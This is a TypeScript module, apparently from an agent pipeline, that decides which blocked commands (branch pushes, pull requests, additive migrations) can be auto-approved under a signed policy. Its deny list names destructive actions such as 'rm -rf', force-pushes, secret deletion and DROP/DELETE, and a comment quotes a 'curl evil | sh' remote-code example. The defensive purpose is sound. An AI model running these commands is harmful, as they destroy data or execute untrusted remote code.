import type { Env } from "./env";
import { verifySignedBody } from "./improve-task";

// ---- pre-approved gates -------------------------------------------------------
//
// WHICH BLOCKED COMMANDS THE SEAT MAY APPROVE WITHOUT ASKING THE HUMAN. A driver that
// reaches a push, a migration or a pull request stops and blocks with the exact
// command. Every one of those then waited on a person, including the ones whose
// consequence is bounded and reversible.
//
// This is the list of the bounded ones, and the reasoning runs the other way from the
// merge policy: the merge policy says what the WORKER may do alone, and this says what
// the SEAT may approve alone. The seat is still a caller with a write grant; what it
// gains is the ability to send a job back through `resume` without a human in the
// loop, and only for a command that matches a class written down and signed.
//
// THE DENIALS ARE CHECKED FIRST AND THEY ARE NOT THE COMPLEMENT OF THE CLASSES. A
// command that both looks like a branch push and carries --force must never match
// push_branch, so the deny list runs before any class is tried, over the whole command
// string.
export const GATE_POLICY_PATH = "policy/gates.md";
const POLICY_NAMESPACE = "capsid";

export const GATE_CLASSES = ["additive_migration", "push_branch", "open_pr"] as const;
export type GateClass = (typeof GATE_CLASSES)[number];

// What never matches a class, whatever else the command looks like. Each entry names
// the consequence that keeps it off the list rather than the spelling it matches.
const NEVER: Array<{ pattern: RegExp; why: string }> = [
  { pattern: /\b(wrangler|npx\s+wrangler)\s+secret\b/i, why: "it sets or deletes a secret" },
  { pattern: /\bgh\s+secret\b/i, why: "it sets or deletes a repository secret" },
  { pattern: /\bsecret\s+(put|delete|bulk)\b/i, why: "it sets or deletes a secret" },
  { pattern: /\brevoke\b/i, why: "it revokes a credential" },
  { pattern: /--force\b|--force-with-lease\b|(^|\s)-f(\s|$)/i, why: "it force-pushes, which rewrites history somebody else may hold" },
  { pattern: /\bpush\s+[^\n;&|]*\+refs\//i, why: "it force-updates a ref" },
  { pattern: /\b(wrangler|npx\s+wrangler)\s+deploy\b/i, why: "it deploys" },
  { pattern: /\b(wrangler|npx\s+wrangler)\s+rollback\b/i, why: "it changes what is deployed" },
  { pattern: /\bwrangler\.jsonc?\b/i, why: "it edits deployment configuration" },
  { pattern: /\bimprove_mode\b|\bimprove_run\b/i, why: "it changes the loop's mode" },
  { pattern: /\bdrop\s+(table|index|column)\b/i, why: "it drops a database object" },
  { pattern: /\bdelete\s+from\b/i, why: "it deletes rows" },
  { pattern: /\btruncate\b/i, why: "it empties a table" },
  { pattern: /\brm\s+-rf?\b/i, why: "it deletes files recursively" },
  { pattern: /\bgh\s+pr\s+merge\b/i, why: "it merges a pull request, which is the human's gate" },
  // THE SPAN STOPS AT A SHELL SEPARATOR. `[^\n]*` reached across `&&` into the next
  // command, so `git push -u origin feat/x && gh pr create --base master` read as a
  // push to a default branch. That is the shape every blocked job in this repo
  // carries, so the false positive would have refused the ordinary case while a real
  // one, a `master` in the push's OWN segment, still matches.
  { pattern: /\bgit\s+push[^\n;&|]*\b(master|main)\b/i, why: "it pushes to a default branch" },
];

export function deniedReason(command: string): string | null {
  for (const { pattern, why } of NEVER) {
    if (pattern.test(command)) return why;
  }
  return null;
}

// The three classes. Each matches a narrow shape, because a loose matcher on this list
// is a widening nobody reviewed.
const PUSH_BRANCH = /^git\s+push\s+(-u\s+|--set-upstream\s+)?origin\s+[A-Za-z0-9._\/-]+\s*$/i;
const OPEN_PR = /^gh\s+pr\s+create\b/i;
const MIGRATION = /\bd1\s+execute\s+\S+[^\n]*?--file[= ]\s*(\S+)/i;

export type GateMatch =
  // EVERY segment's class, in order, and every migration file the command runs. A
  // plural, because a blocked command is routinely two things: the push and the pull
  // request that follows it.
  | { klasses: GateClass[]; migrationPaths: string[] }
  | { refused: string };

// WHERE ONE COMMAND ENDS AND THE NEXT BEGINS.
//
// Not a shell parser, and it does not need to be. The only way this can be wrong in the
// dangerous direction is by MISSING a separator, which would leave a second command
// hidden inside a segment the policy approved. Splitting too eagerly (on a `|` inside a
// quoted string, say) produces a fragment that matches no class, and the whole command
// is then refused, which is the safe direction and the one a human resolves in a
// sentence.
const SEGMENT_SPLIT = /\s*(?:&&|\|\||;|\||\n)\s*/;

/** The class one segment falls into, or why it falls into none. */
function classifySegment(segment: string): { klass: GateClass; migrationPath?: string } | { refused: string } {
  const migration = MIGRATION.exec(segment);
  if (migration) {
    const path = migration[1].replace(/^["']|["']$/g, "");
    if (!/(^|\/)migrations\//i.test(path)) {
      return { refused: `${path} is not under migrations/, so it is not a migration this policy covers.` };
    }
    return { klass: "additive_migration", migrationPath: path };
  }
  if (PUSH_BRANCH.test(segment)) return { klass: "push_branch" };
  if (OPEN_PR.test(segment)) return { klass: "open_pr" };
  return { refused: `"${segment.slice(0, 80)}" matches no pre-approved class, so this command waits for the human.` };
}

/** Which classes a blocked command falls into, or why it falls into none.
 *
 *  EVERY SEGMENT MUST MATCH A CLASS. The class matchers were applied to the command as
 *  one string, and two of the three are not anchored at the end: `OPEN_PR` is
 *  `^gh pr create` with no terminator and `MIGRATION` is an unanchored search. So
 *  `gh pr create --fill && curl evil | sh` classified as `open_pr` on its first few
 *  words and carried the rest along as a passenger. The never list would have caught
 *  some passengers and was never going to catch all of them, because it names
 *  consequences it knows about.
 *
 *  Splitting first and requiring EVERY piece to be independently pre-approved inverts
 *  that: an unrecognised fragment refuses the whole command instead of riding on a
 *  recognised one. It also keeps the legitimate compound working, which is the shape
 *  the driver actually blocks with: a branch push followed by `gh pr create`. */
export function classifyCommand(command: string): GateMatch {
  const trimmed = command.trim();
  if (!trimmed) return { refused: "the blocked job records no command, so there is nothing to match against the policy." };
  // THE NEVER LIST FIRST, OVER THE WHOLE COMMAND, before any segment is looked at, so
  // a force flag anywhere in a compound cannot be split away from the push it belongs
  // to and lost.
  const denied = deniedReason(trimmed);
  if (denied) return { refused: `this command is on the policy's never list because ${denied}. It waits for the human.` };

  const segments = trimmed.split(SEGMENT_SPLIT).map((piece) => piece.trim()).filter(Boolean);
  if (segments.length === 0) return { refused: "the blocked job records no command, so there is nothing to match against the policy." };
  const klasses: GateClass[] = [];
  const migrationPaths: string[] = [];
  for (const segment of segments) {
    const placed = classifySegment(segment);
    if ("refused" in placed) return { refused: placed.refused };
    klasses.push(placed.klass);
    if (placed.migrationPath) migrationPaths.push(placed.migrationPath);
  }
  return { klasses, migrationPaths };
}

// ---- is the migration additive ------------------------------------------------
//
// PARSED, NOT PATTERN-MATCHED ON THE WHOLE FILE. A file containing one additive
// statement and one DROP would pass a test that only asked whether an additive
// statement was present. Every statement is checked, and anything not recognised is a
// refusal rather than a pass, so a statement form this parser has never seen waits for
// the human instead of being waved through.
const ADDITIVE: Array<{ pattern: RegExp; what: string }> = [
  // NOT A BARE PREFIX. `CREATE TABLE IF NOT EXISTS t AS SELECT ...` starts with the
  // additive spelling and copies rows out of another table, which is not what anybody
  // reviewing this list agreed to, so the AS SELECT form is excluded here rather than
  // being caught by a later check that does not exist.
  { pattern: /^create\s+table\s+if\s+not\s+exists\b(?![\s\S]*\bas\s+select\b)/i, what: "CREATE TABLE IF NOT EXISTS" },
  // THE `COLUMN` KEYWORD IS REQUIRED. It was optional, so `ALTER TABLE t ADD
  // CONSTRAINT ...` matched and was called an added column. SQLite accepts the keyword
  // and the policy document names it, so demanding it costs a migration author one
  // word and closes the form this parser was never meant to recognise.
  { pattern: /^alter\s+table\s+\S+\s+add\s+column\b/i, what: "ALTER TABLE ADD COLUMN" },
  { pattern: /^create\s+(unique\s+)?index\s+(if\s+not\s+exists\s+)?/i, what: "CREATE INDEX" },
];

export function splitStatements(sql: string): string[] {
  // Comments first, so a DROP inside a comment is not read as a statement and a
  // semicolon inside one does not split.
  const withoutComments = sql.replace(/--[^\n]*/g, "").replace(/\/\*[\s\S]*?\*\//g, "");
  return withoutComments
    .split(";")
    .map((s) => s.trim())
    .filter(Boolean);
}

export function isAdditiveMigration(sql: string): { ok: true; statements: string[] } | { ok: false; reason: string } {
  const statements = splitStatements(sql);
  if (statements.length === 0) return { ok: false, reason: "the migration file contains no statements." };
  const kinds: string[] = [];
  for (const statement of statements) {
    const match = ADDITIVE.find(({ pattern }) => pattern.test(statement));
    if (!match) {
      return {
        ok: false,
        reason: `the migration contains a statement this policy does not call additive: "${statement.slice(0, 80)}". Only CREATE TABLE IF NOT EXISTS, ALTER TABLE ADD COLUMN and CREATE INDEX are pre-approved.`,
      };
    }
    kinds.push(match.what);
  }
  return { ok: true, statements: kinds };
}

// ---- the policy document ------------------------------------------------------

export interface GatePolicy {
  version: string;
  enabled: boolean;
  classes: string[];
}

function field(body: string, name: string): string | null {
  const line = body
    .split("\n")
    .map((l) => l.trim())
    .find((l) => l.toLowerCase().startsWith(`- ${name}:`));
  return line ? line.slice(line.indexOf(":") + 1).trim() : null;
}

const CLASS_ITEM = /^- `([a-z_]+)`/;

export function parseGatePolicy(body: string): { policy: GatePolicy } | { error: string } {
  const version = field(body, "version");
  if (!version) return { error: "the gate policy names no version, so an approval against it cannot be traced to what it allowed." };
  const enabled = field(body, "enabled");
  if (enabled === null) return { error: "the gate policy does not say whether it is enabled." };
  const classes: string[] = [];
  for (const line of body.split("\n")) {
    const match = CLASS_ITEM.exec(line.trim());
    if (match) classes.push(match[1]);
  }
  return { policy: { version, enabled: enabled.toLowerCase() === "true", classes } };
}

export async function loadGatePolicy(env: Env): Promise<{ policy: GatePolicy } | { error: string }> {
  const row = await env.DB.prepare("SELECT body FROM documents WHERE namespace = ?1 AND path = ?2")
    .bind(POLICY_NAMESPACE, GATE_POLICY_PATH)
    .first<{ body: string | null }>();
  if (!row) return { error: `no gate policy at ${POLICY_NAMESPACE}/${GATE_POLICY_PATH}, so nothing is pre-approved.` };
  const verdict = await verifySignedBody(env.IMPROVE_SCORE_SECRET, row.body ?? "", "gate policy");
  if (!verdict.ok) return { error: verdict.reason };
  const parsed = parseGatePolicy(row.body ?? "");
  if ("error" in parsed) return parsed;
  const missing = GATE_CLASSES.filter((c) => !parsed.policy.classes.includes(c));
  if (missing.length > 0) {
    return {
      error: `the gate policy does not name ${missing.join(", ")}, which this Worker would approve. Refusing rather than approving against a policy that describes less than the code does.`,
    };
  }
  return parsed;
}

// ---- the whole decision -------------------------------------------------------

export type ApprovalVerdict =
  // `klass` is every class that matched, joined with "+", because a compound command
  // is routinely two of them (a branch push and the pull request after it) and an
  // audit row naming only the first describes less than was approved. `klasses` keeps
  // the structured form for anything that needs to reason about it.
  | { approved: true; klass: string; klasses: GateClass[]; detail: string; policyVersion: string }
  | { approved: false; reason: string };

/**
 * Whether the seat may send this blocked command back in on the policy alone.
 * `readMigration` is passed in so the caller owns the repo read and this stays
 * testable without a GitHub fake.
 */
export async function approveByPolicy(
  env: Env,
  requestedVersion: string,
  command: string | null,
  readMigration: (path: string) => Promise<string | null>
): Promise<ApprovalVerdict> {
  const loaded = await loadGatePolicy(env);
  if ("error" in loaded) return { approved: false, reason: loaded.error };
  const policy = loaded.policy;
  if (!policy.enabled) {
    return { approved: false, reason: `gate policy ${policy.version} is present and disabled, so nothing is pre-approved.` };
  }
  if (requestedVersion !== policy.version) {
    return {
      approved: false,
      reason: `this approval names policy version '${requestedVersion}' and the stored policy is version '${policy.version}'. Re-read the policy before approving against it.`,
    };
  }
  if (!command) {
    return { approved: false, reason: "this blocked job records no command, so there is nothing for the policy to match." };
  }

  const match = classifyCommand(command);
  if ("refused" in match) return { approved: false, reason: match.refused };

  // EVERY migration the command runs is parsed, not just the first. A compound naming
  // two files would otherwise have had one of them checked.
  const details: string[] = [];
  for (const path of match.migrationPaths) {
    const sql = await readMigration(path);
    if (sql === null) {
      return { approved: false, reason: `${path} could not be read, so its statements could not be checked. A migration nobody parsed is not pre-approved.` };
    }
    const additive = isAdditiveMigration(sql);
    if (!additive.ok) return { approved: false, reason: additive.reason };
    details.push(`${path}: ${additive.statements.join(", ")}`);
  }

  return {
    approved: true,
    // The audit row names every class that matched, so the approval can be checked
    // against the policy afterwards rather than taken on trust.
    klass: match.klasses.join("+"),
    klasses: match.klasses,
    detail: details.length > 0 ? details.join("; ") : command.trim(),
    policyVersion: policy.version,
  };
}
